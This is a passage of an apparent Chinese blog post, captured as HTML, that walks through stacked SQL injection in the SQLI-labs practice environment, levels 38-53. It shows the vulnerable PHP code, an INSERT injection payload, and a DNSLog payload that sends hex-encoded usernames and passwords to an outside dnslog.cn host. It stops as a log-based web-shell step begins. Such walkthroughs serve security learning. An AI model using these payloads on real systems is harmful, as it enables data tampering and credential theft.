@@ -1,0 +1,1582 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='堆叠注入 38-53 关 原理介绍 MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql&amp;gt; select * from users where id = 1;select version(); &#43;----&#43;----------&#43;----------&#43; | id | username | password | &#43;----&#43;----------&#43;----------&#43; | 1 | Dumb | Dumb | &#43;----&#43;----------&#43;----------&#43; 1 row in set (0.00 sec) &#43;-----------&#43; | version() | &#43;-----------&#43; | 8.0.12 | &#43;-----------&#43; 1 row in set (0.'>
+<title>SQLI labs 靶场笔记之堆叠注入 38-53 关</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/cjxjnagt/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='SQLI labs 靶场笔记之堆叠注入 38-53 关'>
+<meta property='og:description' content='堆叠注入 38-53 关 原理介绍 MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql&amp;gt; select * from users where id = 1;select version(); &#43;----&#43;----------&#43;----------&#43; | id | username | password | &#43;----&#43;----------&#43;----------&#43; | 1 | Dumb | Dumb | &#43;----&#43;----------&#43;----------&#43; 1 row in set (0.00 sec) &#43;-----------&#43; | version() | &#43;-----------&#43; | 8.0.12 | &#43;-----------&#43; 1 row in set (0.'>
+<meta property='og:url' content='https://360rce.github.io/p/cjxjnagt/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL注入' /><meta property='article:tag' content='sqlilab' /><meta property='article:published_time' content='2020-07-22T20:10:24&#43;00:00'/><meta property='article:modified_time' content='2020-07-22T20:10:24&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg' />
+<meta name="twitter:title" content="SQLI labs 靶场笔记之堆叠注入 38-53 关">
+<meta name="twitter:description" content="堆叠注入 38-53 关 原理介绍 MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 mysql&amp;gt; select * from users where id = 1;select version(); &#43;----&#43;----------&#43;----------&#43; | id | username | password | &#43;----&#43;----------&#43;----------&#43; | 1 | Dumb | Dumb | &#43;----&#43;----------&#43;----------&#43; 1 row in set (0.00 sec) &#43;-----------&#43; | version() | &#43;-----------&#43; | 8.0.12 | &#43;-----------&#43; 1 row in set (0."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
+            
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#原理介绍">原理介绍</a>
+      <ol>
+        <li><a href="#局限性">局限性</a></li>
+        <li><a href="#各个数据库堆叠查询实例">各个数据库堆叠查询实例</a></li>
+      </ol>
+    </li>
+    <li><a href="#less-38堆叠注入">Less-38(堆叠注入)</a>
+      <ol>
+        <li><a href="#dnslog-数据外带">DNSLog 数据外带</a></li>
+        <li><a href="#开启日志-getshell">开启日志 Getshell</a></li>
+      </ol>
+    </li>
+    <li><a href="#less-39">Less-39</a></li>
+    <li><a href="#less-40">Less-40</a></li>
+    <li><a href="#less-41">Less-41</a></li>
+    <li><a href="#less-42">Less-42</a></li>
+    <li><a href="#less-43">Less-43</a></li>
+    <li><a href="#less-44">Less-44</a></li>
+    <li><a href="#less-45">Less-45</a></li>
+    <li><a href="#less-46order-by后的注入">Less-46(order by后的注入)</a>
+      <ol>
+        <li><a href="#验证方式">验证方式</a></li>
+        <li><a href="#报错注入">报错注入</a>
+          <ol>
+            <li><a href="#爆数据库">爆数据库</a></li>
+            <li><a href="#爆表">爆表</a></li>
+            <li><a href="#爆users表的表列">爆<code>users</code>表的表列</a></li>
+            <li><a href="#爆users表的数据">爆<code>users</code>表的数据</a></li>
+          </ol>
+        </li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#延时盲注">延时盲注</a></li>
+        <li><a href="#into-outfile">into outfile</a></li>
+      </ol>
+    </li>
+    <li><a href="#less-47">Less-47</a></li>
+    <li><a href="#less-48">Less-48</a></li>
+    <li><a href="#less-49">Less-49</a></li>
+    <li><a href="#less-50">Less-50</a></li>
+    <li><a href="#less-51">Less-51</a></li>
+    <li><a href="#less-52">Less-52</a></li>
+    <li><a href="#less-53">Less-53</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/cjxjnagt/">
+                
+                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg" loading="lazy" alt="Featured image of post SQLI labs 靶场笔记之堆叠注入 38-53 关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
+                吹梦到西州
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cjxjnagt/">SQLI labs 靶场笔记之堆叠注入 38-53 关</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2020/07/22</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="堆叠注入-38-53-关">堆叠注入 38-53 关</h1>
+<h2 id="原理介绍">原理介绍</h2>
+<p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p>
+<h3 id="局限性">局限性</h3>
+<ol>
+<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li>
+<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li>
+</ol>
+<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
+<h3 id="各个数据库堆叠查询实例">各个数据库堆叠查询实例</h3>
+<p><strong>MySQL</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>SQL Server</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select 1,2,3;select * from test;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Postgresql</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">user_test</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注入天书里面说 Oracle 不支持堆叠查询。</p>
+<h2 id="less-38堆叠注入">Less-38(堆叠注入)</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>又到了源码简单分析的时间了，来看看堆叠注入的代码是如何实现的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># id 参数直接带入到 SQL 语句中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_multi_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">))</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出查询信息</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>变成了现在的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_multi_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
+<p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p>
+<p><strong>添加字段值</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;insert into users(username,password) values (&#39;</span><span class="n">hello</span><span class="s1">&#39;,&#39;</span><span class="n">world</span><span class="s1">&#39;);
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>数据库中查看是否添加成功：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;hello&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">hello</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">world</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来演示我认为比较实用的姿势。</p>
+<h3 id="dnslog-数据外带">DNSLog 数据外带</h3>
+<p>需要条件：</p>
+<ol>
+<li>MySQL 开启 load_file()</li>
+<li>DNSLog 平台 （<a class="link" href="http://dnslog.cn/"  target="_blank" rel="noopener"
+    >dnslog</a>、<a class="link" href="http://ceye.io/"  target="_blank" rel="noopener"
+    >CEYE</a>）</li>
+<li>Windows 平台</li>
+</ol>
+<p><code>load_file</code> 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p>
+<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="se">\\</span>192.168.31.53<span class="se">\t</span>est<span class="se">\
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p>
+<p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p>
+<p>下面使用 Windows 下的 sqli-labs 测试环境：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;select load_file(concat(&#39;</span><span class="err">\\\\</span><span class="s1">&#39;,(select hex(concat_ws(&#39;</span><span class="p">:</span><span class="s1">&#39;,username,password)) from users limit 0,1),&#39;</span><span class="p">.</span><span class="mi">952</span><span class="n">nzx</span><span class="p">.</span><span class="n">dnslog</span><span class="p">.</span><span class="n">cn</span><span class="err">\\</span><span class="n">abc</span><span class="s1">&#39;))--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p>
+<p><img src="/p/cjxjnagt/01.png"
+	width="503"
+	height="205"
+	srcset="/p/cjxjnagt/01_hu248de2ab7e249da3b1f3cb19a14e71c4_7932_480x0_resize_box_3.png 480w, /p/cjxjnagt/01_hu248de2ab7e249da3b1f3cb19a14e71c4_7932_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-38_DNSLog 数据外带"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="588px"
+	
+></p>
+<p>手动 Hex 解码即可</p>
+<h3 id="开启日志-getshell">开启日志 Getshell</h3>
+<p>需要条件：</p>
+<ol>
+<li>Web 的物理路径</li>
+<li>MySQL 可以读写 Web 目录</li>
+<li>Windows 成功率 高于 Linux</li>
+</ol>
+<p>首先查看当前的日志的相关配置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;general%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Variable_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Value</span><span class="w">                                                           </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">OFF</span><span class="w">                                                             </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">D</span><span class="p">:</span><span class="err">\</span><span class="n">phpstudy_pro</span><span class="err">\</span><span class="n">Extensions</span><span class="err">\</span><span class="n">MySQL8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span><span class="err">\</span><span class="k">data</span><span class="err">\</span><span class="n">DESKTOP</span><span class="o">-</span><span class="mi">7</span><span class="n">FQSJGU</span><span class="p">.</span><span class="n">log</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------------------+-----------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">warning</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>general_log</code>环境默认是没有开启的，这里尝试注入的时候手动开启：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
